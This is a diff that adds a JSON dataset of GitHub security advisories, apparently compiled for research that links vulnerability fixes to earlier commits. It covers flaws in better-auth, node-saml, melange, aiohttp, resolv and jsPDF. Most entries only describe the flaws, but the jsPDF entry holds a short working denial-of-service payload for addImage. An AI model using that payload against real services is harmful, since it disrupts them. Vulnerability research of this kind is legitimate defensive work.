@@ -1,0 +1,1647 @@
+[
+  {
+    "case_id": "GHSA-7W99-5WM4-3G79",
+    "repository": "better-auth/better-auth",
+    "fix_ref": "b4bc65a007784b2eb0efb459e5fa6fd8055d3ec9",
+    "ai_ancestor": "c6918ecc9e3a75892169415d7f6c95b591b6a52d",
+    "subject": "Merge commit from fork",
+    "published": "2026-07-07T20:56:35Z",
+    "overlap_files": [
+      "packages/oauth-provider/src/token.test.ts",
+      "packages/oauth-provider/src/token.ts"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2026/07/GHSA-7w99-5wm4-3g79/GHSA-7w99-5wm4-3g79.json",
+    "advisory": {
+      "id": "GHSA-7w99-5wm4-3g79",
+      "summary": "@better-auth/oauth-provider's OAuth authorization-code grant allows concurrent redemption when two token requests race the find-then-delete primitive",
+      "details": "### Am I affected?\n\nUsers are affected if all of the following are true:\n\n- Their project depends on `@better-auth/oauth-provider` at a version `>= 1.6.0, < 1.6.11`, or uses the embedded plugin in `better-auth >= 1.4.8-beta.7, < 1.6.0`, or enables the legacy `oidc-provider` or `mcp` plugins from `better-auth/plugins`.\n- Their application exposes `/api/auth/oauth2/token` (or the legacy plugins' `/oauth2/token` and `/mcp/token`) as a token endpoint to OAuth/OIDC clients, including internal MCP clients (Claude Desktop, custom MCP tool callers, AI agents).\n- Their application has not implemented an external mitigation: a load-balancer-level idempotency cache keyed by `code`, a database trigger that rejects duplicate token issuance for the same authorization code, or a custom adapter override that performs an atomic compare-and-delete.\n\nFix:\n\n1. Upgrade to `@better-auth/oauth-provider@1.6.11` or later. If developers use the legacy plugin paths from `better-auth/plugins`, upgrade `better-auth` to `1.6.11` or later.\n2. If developers cannot upgrade, see workarounds below.\n\n### Summary\n\nThe OAuth provider's `POST /oauth2/token` endpoint, on the `authorization_code` grant, redeems a single-use authorization code through a non-atomic find-then-delete sequence. Two concurrent requests with the same `code` value both pass the read step before either delete completes, then both proceed to PKCE verification and `createUserTokens`. Each surviving request mints a fresh access token, refresh token, and id token. RFC 6749 \u00a74.1.2 requires authorization codes to be single-use; this primitive does not enforce that under concurrency.\n\n### Details\n\nThe same architectural primitive (find a single-use verification row, then delete it, then trust the row to authorize) is used in 20 other call sit",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2026-53518"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-294",
+          "CWE-362",
+          "CWE-367"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2026-07-15T18:16:48Z"
+      },
+      "affected_packages": [
+        {
+          "name": "@better-auth/oauth-provider",
+          "ecosystem": "npm"
+        },
+        {
+          "name": "better-auth",
+          "ecosystem": "npm"
+        }
+      ],
+      "refs": [
+        "https://github.com/better-auth/better-auth/security/advisories/GHSA-7w99-5wm4-3g79",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-53518",
+        "https://github.com/better-auth/better-auth/commit/b4bc65a007784b2eb0efb459e5fa6fd8055d3ec9",
+        "https://github.com/better-auth/better-auth",
+        "https://github.com/better-auth/better-auth/releases/tag/v1.6.11"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/better-auth__better-auth",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "c6918ecc9e3a75892169415d7f6c95b591b6a52d\na1c9f3c08e7398e900e099839aa6dcc8d1d0b816\nMerge commit from fork\n\nThe `authorization_code`-grant rotation in `createRefreshToken` and the explicit `revokeRefreshToken` path both updated the parent `oauthRefreshToken` row using an `id`-only predicate, so two concurrent rotations (or a rotation racing a revoke) both pass the `revoked` check and last-write-wins. Each surviving request mints a fresh refresh token, producing a forked family from one parent.\n\nBoth call sites now perform a compare-and-swap (`UPDATE ... WHERE id = ? AND revoked IS NULL`) and short-circuit with `invalid_grant` when the row was already consumed. The parent stays marked revoked, so any subsequent replay trips the existing family-invalidation guard in `handleRefreshTokenGrant`. The shared family-delete is centralized in `invalidateRefreshFamily`, which clears child access tokens before refresh rows to honor the schema's foreign-key direction; the `oauthRefreshToken.token` column also gains a `unique` constraint for parity with `oauthAccessToken.token`. Strict family invalidation on contested rotations (RFC 9700 \u00a74.14) is tracked in a FIXME for a follow-up minor that opts into transactional rotation in the adapter contract.\n\nCloses GHSA-392p-2q2v-4372.\n\nCo-authored-by: chdanielmueller <4051999+chdanielmueller@users.noreply.github.com>\n",
+    "fix_msg": "b4bc65a007784b2eb0efb459e5fa6fd8055d3ec9\nc6918ecc9e3a75892169415d7f6c95b591b6a52d\nMerge commit from fork\n\nThe `authorization_code` grant's verification step was a `findOne` + `deleteOne` pair, so two concurrent `POST /oauth2/token` requests sharing the same `code` both pass the find, both delete, and both mint independent access/refresh/id token sets: a CAS gap that lets an authorization code be redeemed twice. The legacy `oidc-provider` and `mcp` plugins in `better-auth` share the same primitive on their `authorization_code` paths and have the same gap.\n\nAll three call sites now use `internalAdapter.consumeVerificationValue` (the atomic primitive added in better-auth#9560 and renamed in better-auth#9568): the first concurrent caller receives the row and mints tokens, subsequent racers receive `null`. The consumed and expired paths return RFC 6749 \u00a75.2 `invalid_grant` instead of the better-auth-internal `invalid_verification`, so spec-compliant clients can branch on the standard code. The redundant second `deleteVerificationByIdentifier` call after PKCE validation in the legacy paths is removed.\n\nCloses GHSA-7w99-5wm4-3g79.\n\nCo-authored-by: chdanielmueller <4051999+chdanielmueller@users.noreply.github.com>\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "a1c9f3c08e7398e900e099839aa6dcc8d1d0b816"
+    ],
+    "fix_parents": [
+      "c6918ecc9e3a75892169415d7f6c95b591b6a52d"
+    ]
+  },
+  {
+    "case_id": "GHSA-4MXG-3P6V-XGQ3",
+    "repository": "node-saml/node-saml",
+    "fix_ref": "31ead9411ebc3e2385086fa9149b6c17732bca10",
+    "ai_ancestor": "37ee11ec4b0f3a31813d93bb5d358556f12b76e2",
+    "subject": "Bump release-it from 16.3.0 to 17.0.5 (#348)",
+    "published": "2025-07-28T20:38:44Z",
+    "overlap_files": [
+      "package-lock.json",
+      "package.json"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/07/GHSA-4mxg-3p6v-xgq3/GHSA-4mxg-3p6v-xgq3.json",
+    "advisory": {
+      "id": "GHSA-4mxg-3p6v-xgq3",
+      "summary": "Node-SAML SAML Signature Verification Vulnerability",
+      "details": "Node-SAML loads the assertion from the (unsigned) original response document. This is different than the parts that are verified when checking signature.\n\nThis allows an attacker to modify authentication details within a valid SAML assertion. For example, in one attack it is possible to remove any character from the SAML assertion username.\n\nTo conduct the attack an attacker would need a validly signed document from the identity provider (IdP).\n\nIn fixing this we made sure to process the SAML assertions from only verified/authenticated contents. This will prevent future variants from coming up. \n\nNote: this is distinct from the previous xml-crypto CVEs.",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2025-54419"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-287",
+          "CWE-347"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-07-28T20:17:48Z"
+      },
+      "affected_packages": [
+        {
+          "name": "@node-saml/node-saml",
+          "ecosystem": "npm"
+        },
+        {
+          "name": "passport-saml",
+          "ecosystem": "npm"
+        },
+        {
+          "name": "@node-saml/passport-saml",
+          "ecosystem": "npm"
+        }
+      ],
+      "refs": [
+        "https://github.com/node-saml/node-saml/security/advisories/GHSA-4mxg-3p6v-xgq3",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-54419",
+        "https://github.com/node-saml/node-saml/commit/31ead9411ebc3e2385086fa9149b6c17732bca10",
+        "https://github.com/node-saml/node-saml",
+        "https://github.com/node-saml/node-saml/releases/tag/v5.1.0"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/node-saml__node-saml",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "37ee11ec4b0f3a31813d93bb5d358556f12b76e2\n0ca8d5506e86e3a37efd682fc468a2be0e945461\nBump release-it from 16.3.0 to 17.0.5 (#348)\n\nBumps [release-it](https://github.com/release-it/release-it) from 16.3.0 to 17.0.5.\n- [Release notes](https://github.com/release-it/release-it/releases)\n- [Changelog](https://github.com/release-it/release-it/blob/main/CHANGELOG.md)\n- [Commits](https://github.com/release-it/release-it/compare/16.3.0...17.0.5)\n\n---\nupdated-dependencies:\n- dependency-name: release-it\n  dependency-type: direct:development\n  update-type: version-update:semver-major\n...\n\nSigned-off-by: dependabot[bot] <support@github.com>\nCo-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>\n",
+    "fix_msg": "31ead9411ebc3e2385086fa9149b6c17732bca10\n6c81160834cdeb8cb482893de0e2e1da8d199657\nUse new .signedReferences interace in xml-crypto to \"see what is signed\" (#397)\n\n\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "0ca8d5506e86e3a37efd682fc468a2be0e945461"
+    ],
+    "fix_parents": [
+      "6c81160834cdeb8cb482893de0e2e1da8d199657"
+    ]
+  },
+  {
+    "case_id": "GHSA-M837-G268-MMV7",
+    "repository": "node-saml/node-saml",
+    "fix_ref": "31ead9411ebc3e2385086fa9149b6c17732bca10",
+    "ai_ancestor": "37ee11ec4b0f3a31813d93bb5d358556f12b76e2",
+    "subject": "Bump release-it from 16.3.0 to 17.0.5 (#348)",
+    "published": "2025-07-25T14:08:50Z",
+    "overlap_files": [
+      "package-lock.json",
+      "package.json"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/07/GHSA-m837-g268-mmv7/GHSA-m837-g268-mmv7.json",
+    "advisory": {
+      "id": "GHSA-m837-g268-mmv7",
+      "summary": "Node-SAML SAML Authentication Bypass",
+      "details": "Node-SAML loads the assertion from the (unsigned) original response document. This is different than the parts that are verified when checking signature. \n\nThis allows an attacker to modify authentication details within a valid SAML assertion. For example, in one attack it is possible to remove any character from the SAML assertion username.\n\nTo conduct the attack an attacker would need a validly signed document from the identity provider (IdP).\n\nIn fixing this we upgraded xml-crypto to v6.1.2 and made sure to process the SAML assertions from only verified/authenticated contents. This will prevent future variants from coming up.",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2025-54369"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-287",
+          "CWE-347",
+          "CWE-87"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-07-24T23:15:26Z"
+      },
+      "affected_packages": [
+        {
+          "name": "node-saml",
+          "ecosystem": "npm"
+        },
+        {
+          "name": "@node-saml/node-saml",
+          "ecosystem": "npm"
+        }
+      ],
+      "refs": [
+        "https://github.com/node-saml/node-saml/security/advisories/GHSA-m837-g268-mmv7",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-54369",
+        "https://github.com/node-saml/node-saml/commit/31ead9411ebc3e2385086fa9149b6c17732bca10",
+        "https://github.com/node-saml/node-saml",
+        "https://github.com/node-saml/node-saml/releases/tag/v5.1.0"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/node-saml__node-saml",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "37ee11ec4b0f3a31813d93bb5d358556f12b76e2\n0ca8d5506e86e3a37efd682fc468a2be0e945461\nBump release-it from 16.3.0 to 17.0.5 (#348)\n\nBumps [release-it](https://github.com/release-it/release-it) from 16.3.0 to 17.0.5.\n- [Release notes](https://github.com/release-it/release-it/releases)\n- [Changelog](https://github.com/release-it/release-it/blob/main/CHANGELOG.md)\n- [Commits](https://github.com/release-it/release-it/compare/16.3.0...17.0.5)\n\n---\nupdated-dependencies:\n- dependency-name: release-it\n  dependency-type: direct:development\n  update-type: version-update:semver-major\n...\n\nSigned-off-by: dependabot[bot] <support@github.com>\nCo-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>\n",
+    "fix_msg": "31ead9411ebc3e2385086fa9149b6c17732bca10\n6c81160834cdeb8cb482893de0e2e1da8d199657\nUse new .signedReferences interace in xml-crypto to \"see what is signed\" (#397)\n\n\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "0ca8d5506e86e3a37efd682fc468a2be0e945461"
+    ],
+    "fix_parents": [
+      "6c81160834cdeb8cb482893de0e2e1da8d199657"
+    ]
+  },
+  {
+    "case_id": "GHSA-5662-CV6M-63WH",
+    "repository": "chainguard-dev/melange",
+    "fix_ref": "1b272db2a0bb3441553284cc56d87236b4b64c04",
+    "ai_ancestor": "881f41bc274ac28abdace9292ea96425828d3ddc",
+    "subject": "build(deps): bump cloud.google.com/go/storage from 1.50.0 to 1.51.0 (#1855)",
+    "published": "2025-07-18T20:13:21Z",
+    "overlap_files": [
+      "go.mod",
+      "go.sum"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/07/GHSA-5662-cv6m-63wh/GHSA-5662-cv6m-63wh.json",
+    "advisory": {
+      "id": "GHSA-5662-cv6m-63wh",
+      "summary": "melange's world-writable permissions expose SBOM files to potential image tampering",
+      "details": "It was discovered that the SBOM files generated by melange in apks had file system permissions mode 666:\n```\n$ apkrane ls https://packages.wolfi.dev/os/x86_64/APKINDEX.tar.gz -P hello-wolfi --full --latest  | xargs wget -q -O  - | tar tzv 2>/dev/null var/lib/db/sbom\ndrwxr-xr-x root/root         0 2025-06-23 14:17 var/lib/db/sbom\n-rw-rw-rw- root/root      3383 2025-06-23 14:17 var/lib/db/sbom/hello-wolfi-2.12.2-r1.spdx.json\n```\n\nThis issue was introduced in commit 1b272db (\"Persist workspace filesystem throughout package builds (#1836)\") ([v0.23.0](https://github.com/chainguard-dev/melange/releases/tag/v0.23.0)).\n\n### Impact\nThis potentially allows an unprivileged user to tamper with apk SBOMs on a running image, potentially confusing security scanners. An attacker could also perform a DoS under special circumstances.\n\n### Patches\nThis issue was addressed in melange in e29494b (\"fix: tighten up permissions for written SBOM files and signature tarballs (#2086)\") ([v0.29.5](https://github.com/chainguard-dev/melange/releases/tag/v0.29.5)).\n\n## Acknowledgements\n\nThanks to Cody Harris [H2O.ai](https://h2o.ai/) and Markus Boehme for independently reporting this issue.",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2025-54059"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-276"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-07-18T16:15:30Z"
+      },
+      "affected_packages": [
+        {
+          "name": "chainguard.dev/melange",
+          "ecosystem": "Go"
+        }
+      ],
+      "refs": [
+        "https://github.com/chainguard-dev/melange/security/advisories/GHSA-5662-cv6m-63wh",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-54059",
+        "https://github.com/chainguard-dev/melange/pull/1836",
+        "https://github.com/chainguard-dev/melange/pull/2086",
+        "https://github.com/chainguard-dev/melange/commit/1b272db2a0bb3441553284cc56d87236b4b64c04",
+        "https://github.com/chainguard-dev/melange/commit/e29494b4a40a91619ec1c87a09003c6d5164cea1",
+        "https://github.com/chainguard-dev/melange",
+        "https://github.com/chainguard-dev/melange/releases/tag/v0.29.5"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/chainguard-dev__melange",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "881f41bc274ac28abdace9292ea96425828d3ddc\n541225b61139ae44935bdb5dc49abf74867c6502\nbuild(deps): bump cloud.google.com/go/storage from 1.50.0 to 1.51.0 (#1855)\n\nBumps [cloud.google.com/go/storage](https://github.com/googleapis/google-cloud-go) from 1.50.0 to 1.51.0.\n- [Release notes](https://github.com/googleapis/google-cloud-go/releases)\n- [Changelog](https://github.com/googleapis/google-cloud-go/blob/main/CHANGES.md)\n- [Commits](https://github.com/googleapis/google-cloud-go/compare/spanner/v1.50.0...spanner/v1.51.0)\n\n---\nupdated-dependencies:\n- dependency-name: cloud.google.com/go/storage\n  dependency-type: direct:production\n  update-type: version-update:semver-minor\n...\n\nSigned-off-by: dependabot[bot] <support@github.com>\nCo-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>\n",
+    "fix_msg": "1b272db2a0bb3441553284cc56d87236b4b64c04\n881f41bc274ac28abdace9292ea96425828d3ddc\nPersist workspace filesystem throughout package builds (#1836)\n\n\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "541225b61139ae44935bdb5dc49abf74867c6502"
+    ],
+    "fix_parents": [
+      "881f41bc274ac28abdace9292ea96425828d3ddc"
+    ]
+  },
+  {
+    "case_id": "GHSA-MWH4-6H8G-PG8W",
+    "repository": "aio-libs/aiohttp",
+    "fix_ref": "53b35a2f8869c37a133e60bf1a82a1c01642ba2b",
+    "ai_ancestor": "db560cfeab32aa35f3d06f7a24238bedc01ffe2b",
+    "subject": "Reject null bytes in headers (#12210) (#12214)",
+    "published": "2026-04-01T21:48:24Z",
+    "overlap_files": [
+      "aiohttp/_http_writer.pyx",
+      "aiohttp/http_writer.py"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2026/04/GHSA-mwh4-6h8g-pg8w/GHSA-mwh4-6h8g-pg8w.json",
+    "advisory": {
+      "id": "GHSA-mwh4-6h8g-pg8w",
+      "summary": "AIOHTTP has HTTP response splitting via \\r in reason phrase",
+      "details": "### Summary\n\nAn attacker who controls the `reason` parameter when creating a `Response` may be able to inject extra headers or similar exploits.\n\n### Impact\n\nIn the unlikely situation that an application allows untrusted data to be used in the response's `reason` parameter, then an attacker could manipulate the response to send something different from what the developer intended.\n\n-----\n\nPatch: https://github.com/aio-libs/aiohttp/commit/53b35a2f8869c37a133e60bf1a82a1c01642ba2b",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:U"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2026-34519"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-113"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2026-04-01T21:17:00Z"
+      },
+      "affected_packages": [
+        {
+          "name": "aiohttp",
+          "ecosystem": "PyPI"
+        }
+      ],
+      "refs": [
+        "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-mwh4-6h8g-pg8w",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-34519",
+        "https://github.com/aio-libs/aiohttp/commit/53b35a2f8869c37a133e60bf1a82a1c01642ba2b",
+        "https://github.com/aio-libs/aiohttp",
+        "https://github.com/aio-libs/aiohttp/releases/tag/v3.13.4"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/aio-libs__aiohttp",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "db560cfeab32aa35f3d06f7a24238bedc01ffe2b\nd5cd8727f90d65f74f5ba574eec1f8dc100fd96a\nReject null bytes in headers (#12210) (#12214)\n\n(cherry picked from commit bad4131d31a6d4ce71c3a7cc83b9fc01a70dfe55)\n\nCo-authored-by: vmfunc <celeste@linux.com>\n",
+    "fix_msg": "53b35a2f8869c37a133e60bf1a82a1c01642ba2b\ndb560cfeab32aa35f3d06f7a24238bedc01ffe2b\nRestrict reason (#12209) (#12212)\n\n(cherry picked from commit 18510482de080bf741c560bf2a190fdc54b4eed4)\n\n---------\n\nCo-authored-by: Dhiral Vyas <dhiral@users.noreply.github.com>\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "d5cd8727f90d65f74f5ba574eec1f8dc100fd96a"
+    ],
+    "fix_parents": [
+      "db560cfeab32aa35f3d06f7a24238bedc01ffe2b"
+    ]
+  },
+  {
+    "case_id": "GHSA-XH69-987W-HRP8",
+    "repository": "ruby/resolv",
+    "fix_ref": "4c2f71b5e80826506f78417d85b38481c058fb25",
+    "ai_ancestor": "7d524df80eea6f335995af85d4de1fa50b944759",
+    "subject": "Fix TCP fallback with multiple nameservers",
+    "published": "2025-07-15T14:37:08Z",
+    "overlap_files": [
+      "lib/resolv.rb",
+      "test/resolv/test_dns.rb"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/07/GHSA-xh69-987w-hrp8/GHSA-xh69-987w-hrp8.json",
+    "advisory": {
+      "id": "GHSA-xh69-987w-hrp8",
+      "summary": "resolv vulnerable to DoS via insufficient DNS domain name length validation",
+      "details": "A denial of service vulnerability has been discovered in the resolv gem bundled with Ruby.\n\n## Details\nThe vulnerability is caused by an insufficient check on the length of a decompressed domain name within a DNS packet.\n\nAn attacker can craft a malicious DNS packet containing a highly compressed domain name. When the resolv library parses such a packet, the name decompression process consumes a large amount of CPU resources, as the library does not limit the resulting\nlength of the name.\n\nThis resource consumption can cause the application thread to become unresponsive, resulting in a Denial of Service condition.\n\n## Affected Version\nThe vulnerability affects the resolv gem bundled with the following Ruby series:\n* Ruby 3.2 series: resolv version 0.2.2 and earlier\n* Ruby 3.3 series: resolv version 0.3.0\n* Ruby 3.4 series: resolv version 0.6.1 and earlier\n\n## Credits\nThanks to Manu for discovering this issue.\n\n## History\nOriginally published at 2025-07-08 07:00:00 (UTC)",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:U"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2025-24294"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-1284",
+          "CWE-400"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-07-12T04:15:46Z"
+      },
+      "affected_packages": [
+        {
+          "name": "resolv",
+          "ecosystem": "RubyGems"
+        },
+        {
+          "name": "resolv",
+          "ecosystem": "RubyGems"
+        },
+        {
+          "name": "resolv",
+          "ecosystem": "RubyGems"
+        }
+      ],
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-24294",
+        "https://github.com/ruby/resolv/commit/4c2f71b5e80826506f78417d85b38481c058fb25",
+        "https://github.com/ruby/resolv",
+        "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/resolv/CVE-2025-24294.yml",
+        "https://www.ruby-lang.org/en/news/2025/07/08/dos-resolv-cve-2025-24294"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/ruby__resolv",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "7d524df80eea6f335995af85d4de1fa50b944759\nb25c63cf7cef2b298a47634fcb50ae1ec288d7df\nFix TCP fallback with multiple nameservers\n\nUnder the following conditions the exception\n`Resolv::DNS::Requester::RequestError: host/port don't match` is raised:\n- Multiple nameservers are configured for Resolv::DNS\n- A nameserver falls back from UDP to TCP\n- TCP request hits Resolv::DNS timeout\n- Resolv::DNS retries the next nameserver\n\nMore details here https://bugs.ruby-lang.org/issues/8285\n\nCo-authored-by: Julian Mehnle <julian@mehnle.net>\n\n",
+    "fix_msg": "4c2f71b5e80826506f78417d85b38481c058fb25\nc1031bfeebfca62284fa34cd346a1552ddea9d71\nLimit decompressed name length\n\nRFC 1035 specifies the 255-octet maximum name length. This change set\nchecks the limit.\n\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "b25c63cf7cef2b298a47634fcb50ae1ec288d7df"
+    ],
+    "fix_parents": [
+      "c1031bfeebfca62284fa34cd346a1552ddea9d71"
+    ]
+  },
+  {
+    "case_id": "GHSA-8MVJ-3J78-4QMW",
+    "repository": "parallax/jsPDF",
+    "fix_ref": "4cf3ab619e565d9b88b4b130bff901b91d8688e9",
+    "ai_ancestor": "d8bfc9f0af8a91ff96c8396147b582d136551151",
+    "subject": "fix: upgrade @babel/runtime from 7.26.7 to 7.26.9 (#3847)",
+    "published": "2025-08-26T16:19:04Z",
+    "overlap_files": [
+      "package-lock.json",
+      "package.json"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/08/GHSA-8mvj-3j78-4qmw/GHSA-8mvj-3j78-4qmw.json",
+    "advisory": {
+      "id": "GHSA-8mvj-3j78-4qmw",
+      "summary": "jsPDF Denial of Service (DoS)",
+      "details": "### Impact\nUser control of the first argument of the addImage method results in CPU utilization and denial of service.\n\nIf given the possibility to pass unsanitized image data or URLs to the addImage method, a user can provide a harmful PNG file that results in high CPU utilization and denial of service.\n\nOther affected methods are: `html`.\n\nExample payload:\n\n```js\nimport { jsPDF } from \"jspdf\" \n\nconst payload = new Uint8Array([117, 171, 90, 253, 166, 154, 105, 166, 154])\n\nconst doc = new jsPDF();\nconst startTime = performance.now();\ntry {\n  doc.addImage(payload, \"PNG\", 10, 40, 180, 180, undefined, \"SLOW\");\n} finally {\n  const endTime = performance.now();\n  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`);\n}\n```\n\n### Patches\nThe vulnerability was fixed in jsPDF 3.0.2. Upgrade to jspdf@>=3.0.2.\n\nIn jspdf@>=3.0.2, invalid PNG files throw an Error instead of causing very long running loops.\n\n### Workarounds\nSanitize image data or URLs before passing it to the addImage method or one of the other affected methods.\n\n### Credits\nResearcher: Aleksey Solovev (Positive Technologies)",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2025-57810"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-20",
+          "CWE-835"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-08-26T16:15:37Z"
+      },
+      "affected_packages": [
+        {
+          "name": "jspdf",
+          "ecosystem": "npm"
+        }
+      ],
+      "refs": [
+        "https://github.com/parallax/jsPDF/security/advisories/GHSA-8mvj-3j78-4qmw",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-57810",
+        "https://github.com/parallax/jsPDF/pull/3880",
+        "https://github.com/parallax/jsPDF/commit/4cf3ab619e565d9b88b4b130bff901b91d8688e9",
+        "https://github.com/parallax/jsPDF",
+        "https://github.com/parallax/jsPDF/releases/tag/v3.0.2"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/parallax__jsPDF",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "d8bfc9f0af8a91ff96c8396147b582d136551151\n57cbe9499dc9922c1a8dbdd225f9c45364653324\nfix: upgrade @babel/runtime from 7.26.7 to 7.26.9 (#3847)\n\nSnyk has created this PR to upgrade @babel/runtime from 7.26.7 to 7.26.9.\n\nSee this package in npm:\n@babel/runtime\n\nSee this project in Snyk:\nhttps://app.snyk.io/org/mrrio/project/50515eb1-b03b-4f42-9f17-cce1a33d5d1a?utm_source=github&utm_medium=referral&page=upgrade-pr\n\nCo-authored-by: snyk-bot <snyk-bot@snyk.io>\n",
+    "fix_msg": "4cf3ab619e565d9b88b4b130bff901b91d8688e9\n7c51caa387b5c08326fc5e70ac7f5e266741fcae\nFix parsing corrupt PNG images in the addImage method (#3880)\n\n- remove atob and btoa dependencies and use native implementations for node build, as well\n- replace built-in PNG parser with the fast-png 3rd party dependency\n- consistently support 16bit color spaces\n- fix compression being applied with compression=\"NONE\" in some cases\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "57cbe9499dc9922c1a8dbdd225f9c45364653324"
+    ],
+    "fix_parents": [
+      "7c51caa387b5c08326fc5e70ac7f5e266741fcae"
+    ]
+  },
+  {
+    "case_id": "GHSA-FVMW-CJ7J-J39Q",
+    "repository": "withastro/astro",
+    "fix_ref": "9e9c528191b6f5e06db9daf6ad26b8f68016e533",
+    "ai_ancestor": "0f75f6bc637d547e07324e956db21d9f245a3e8e",
